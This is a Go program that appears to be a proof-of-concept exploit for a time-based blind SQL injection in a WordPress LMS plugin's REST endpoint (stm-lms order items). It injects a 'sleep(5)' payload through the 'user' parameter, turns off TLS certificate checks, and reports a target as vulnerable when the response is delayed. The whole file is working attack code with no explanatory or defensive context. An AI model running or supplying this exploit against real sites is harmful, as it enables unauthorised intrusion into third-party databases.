package main

import (
    "crypto/tls"
    "fmt"
    "net/http"
    "net/url"
    "os"
    "time"
)

func main() {
    if len(os.Args) < 2 {
        fmt.Println("Usage: go run main.go http://example.com")
        os.Exit(1)
    }

    baseURL := os.Args[1]

    query1 := "/?rest_route=/lms/stm-lms/order/items&author_id=111&user="
    query2 := "1) AND (SELECT 1 FROM (SELECT sleep(5))AA"
    encodedQuery := url.QueryEscape(query2)

    fullURL := baseURL + query1 + encodedQuery
    fmt.Println(fullURL)

    http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

    client := &http.Client{
        Timeout: 100 * time.Second,
    }

    startTime := time.Now()

    resp, err := client.Get(fullURL)
    if err != nil {
        fmt.Printf("Error making request: %v\n", err)
        os.Exit(1)
    }
    defer resp.Body.Close()

    responseTime := time.Since(startTime)

    if responseTime >= 5*time.Second {
        fmt.Printf("Success: %s | Response Time:%s\n", baseURL, responseTime)
    } else {
        fmt.Printf("Fail: %s | Response Time:%s\n", baseURL, responseTime)
    }
}
